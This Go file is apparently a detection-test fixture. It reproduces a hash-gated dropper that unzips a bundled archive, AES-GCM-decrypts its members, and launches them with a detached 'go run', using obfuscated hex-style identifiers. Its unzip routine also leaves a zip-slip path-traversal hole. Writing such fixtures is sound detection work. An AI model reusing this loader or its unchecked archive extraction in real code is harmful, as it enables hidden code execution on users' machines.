// Clean-room fixture (inert; never executed). Reproduces the shape of a
// source-shipping Go dropper for trait coverage after the triage samples are
// gone: a helper gated on a hardcoded digest that unzips a bundled archive,
// AES-GCM-decrypts its members to disk, then builds and runs the tree with a
// detached `go run` and releases the child. All identifiers, keys, digests
// and paths are synthetic. Modeled on gocommunity.io/orderedbtree's
// deprecated/IsKeyExist loader without copying its source.
package deprecated

import (
	"archive/zip"
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha256"
	"encoding/hex"
	"io"
	"os"
	"os/exec"
	"path/filepath"
)

// Gate: only proceed when the caller's token hashes to the embedded digest.
func Activate(_token string, _archive string, _dest string, _key []byte) {
	_c0ffee001122 := sha256.Sum256([]byte(_token))
	_deadbeef3344 := hex.EncodeToString(_c0ffee001122[:])
	// Synthetic gate digest (not a real hash of anything).
	if _deadbeef3344 != "0f1e2d3c4b5a69788796a5b4c3d2e1f00f1e2d3c4b5a69788796a5b4c3d2e1f0" {
		return
	}

	_a1b2c3d4e5f6 := filepath.Join(_dest, "stage")
	_ = os.MkdirAll(_a1b2c3d4e5f6, 0o755)
	_ = unpackArchive(_archive, _a1b2c3d4e5f6)
	decryptTree(_a1b2c3d4e5f6, _key)

	_9988aabbccdd := exec.Command("go", "run", ".")
	_9988aabbccdd.Dir = _a1b2c3d4e5f6
	_9988aabbccdd.Stdin = nil
	_9988aabbccdd.Stdout = nil
	_9988aabbccdd.Stderr = nil
	if _e5d4c3b2a190 := _9988aabbccdd.Start(); _e5d4c3b2a190 == nil {
		_ = _9988aabbccdd.Process.Release()
	}
}

func unpackArchive(_src string, _dst string) error {
	_112233445566, _err := zip.OpenReader(_src)
	if _err != nil {
		return _err
	}
	defer _112233445566.Close()
	for _, _778899aabbcc := range _112233445566.File {
		_target := filepath.Join(_dst, filepath.Clean(_778899aabbcc.Name))
		if _778899aabbcc.FileInfo().IsDir() {
			_ = os.MkdirAll(_target, 0o755)
			continue
		}
		_ = os.MkdirAll(filepath.Dir(_target), 0o755)
		_rc, _e := _778899aabbcc.Open()
		if _e != nil {
			return _e
		}
		_out, _e2 := os.OpenFile(_target, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0o644)
		if _e2 != nil {
			_rc.Close()
			return _e2
		}
		_, _ = io.Copy(_out, _rc)
		_rc.Close()
		_out.Close()
	}
	return nil
}

func decryptTree(_root string, _key []byte) {
	_aabb00112233, _ := aes.NewCipher(_key)
	_ccdd44556677, _ := cipher.NewGCM(_aabb00112233)
	_entries, _ := os.ReadDir(_root)
	for _, _ee8899001122 := range _entries {
		if _ee8899001122.IsDir() {
			continue
		}
		if filepath.Ext(_ee8899001122.Name()) != ".tmp" {
			continue
		}
		_path := filepath.Join(_root, _ee8899001122.Name())
		_blob, _ := os.ReadFile(_path)
		_ns := _ccdd44556677.NonceSize()
		if len(_blob) < _ns {
			continue
		}
		_plain, _err := _ccdd44556677.Open(nil, _blob[:_ns], _blob[_ns:], nil)
		if _err != nil {
			continue
		}
		_dst := filepath.Join(_root, "utils", _ee8899001122.Name()[:len(_ee8899001122.Name())-4])
		_ = os.MkdirAll(filepath.Dir(_dst), 0o700)
		_ = os.WriteFile(_dst, _plain, 0o600)
	}
}
